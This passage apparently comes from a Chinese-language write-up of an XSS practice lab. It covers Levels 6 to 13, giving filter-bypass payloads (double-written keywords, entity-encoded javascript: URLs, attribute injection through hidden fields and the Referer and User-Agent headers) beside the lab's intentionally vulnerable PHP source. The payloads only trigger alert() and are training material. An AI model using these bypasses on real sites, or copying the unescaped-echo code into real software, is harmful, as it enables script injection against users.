<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str6</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Level 7</p>
<p>本题以删除的方式过滤了href和script，可以使用双写绕过</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240202154250121.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240202154250121.png" alt="image-20240202154250121"></a></p>
<p><strong>答案：<code>&quot;&gt;&lt;a HRHREFEF=&quot;javascrscriptipt:alert(1)&quot;&gt;1&lt;/a&gt;//</code></strong></p>
<p>源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> =<span class="title function_ invoke__">strtolower</span>( <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level7.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str6</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Level 8</p>
<p>本题以添加下划线和html实体编码的形式绕过了href 、&lt;&gt; 、script 、&quot;等字符，我们可以采用HTML实体编码+URL编码的形式在URL中直接写入，也可以在input标签内输入HTML实体编码。input标签也会默认对Unicode进行解码，所以本题可使用编码方式绕过。</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240202154853561.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240202154853561.png" alt="image-20240202154853561"></a></p>
<p>相关网站：</p>
<p><a target="_blank" rel="noopener" href="https://config.net.cn/tools/HtmlEncode.html">在线Html实体编码解码</a></p>
<p><a target="_blank" rel="noopener" href="http://www.esjson.com/urlEncode.html">在线url网址编码解码</a></p>
<p><a target="_blank" rel="noopener" href="http://www.esjson.com/unicodeEncode.html">在线Unicode编码转换工具)</a></p>
<p><strong>答案：<code>javaScript:alert(1)</code></strong></p>
<p>即：javascript:alert(1) #HTML实体编码-&gt;URL编码</p>
<p>源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Level 9</p>
<p>本题相较Level 8新增了网址合法性检测，经测试只需带有<a target="_blank" rel="noopener" href="http://xn--zlr2ki56c6eedn6choa/">http://即可通过检测</a>，可以将alert()内的字符改成http://，也可以在文末添加并使用注释符进行注释。</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240202155310700.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240202155310700.png" alt="image-20240202155310700"></a></p>
<p><strong>答案：<code>javaScript:alert('http://')</code></strong></p>
<p>即：javascript:alert(‘http://’)</p>
<p>源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Level 10</p>
<p>测试第一个标签处，发现全都被过滤</p>
<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/cac51a8eb6fd47de8782e2b57d225cf8.png"><img src="https://img-blog.csdnimg.cn/cac51a8eb6fd47de8782e2b57d225cf8.png" alt="img"></a></p>
<p>只能从源代码中的三个hidden元素入手，进行传值测试后发现t_sort有回显(GET)，其余两个猜测为POST型</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240202155934507.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240202155934507.png" alt="image-20240202155934507"></a></p>
<p><strong>答案：<code>?t_sort=&quot; onfocus=javascript:alert() type=&quot;text//</code></strong> ，因为此处输入框被隐藏，需要添加type=“text”，或者在控制台内修改此处的hidden为button等。</p>
<p>源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Level 11</p>
<p>查看网页源代码发现有四个hidden，分别尝试传值发现t_sort有回显，但几乎所有方法都被过滤，猜测t_ref为Referer头</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204135104746.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204135104746.png" alt="image-20240204135104746"></a></p>
<p>BP抓包向Referer头填充数值1即可发现回显在t_ref内，可以在Referer头内构造Payload，相应包正确后在抓到的包内添加Referer头并放包即可。</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204135754206.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204135754206.png" alt="image-20240204135754206"></a></p>
<p><strong>答案：<code>Referer: &quot; onclick=&quot;alert(1)&quot; type=&quot;true</code></strong></p>
<p>源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level12.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level11&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Level 12</p>
<p>与11题原理相同，注入点在UA头</p>
<p><strong>答案：<code>User-Agent: &quot; onclick=&quot;alert(1)&quot; type=&quot;true</code></strong></p>
<p>源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level13.php?keyword=good job!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level12&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Level 13</p>
<p>原理与11题一样，注入点在Cookie，注意要触发cookie</p>
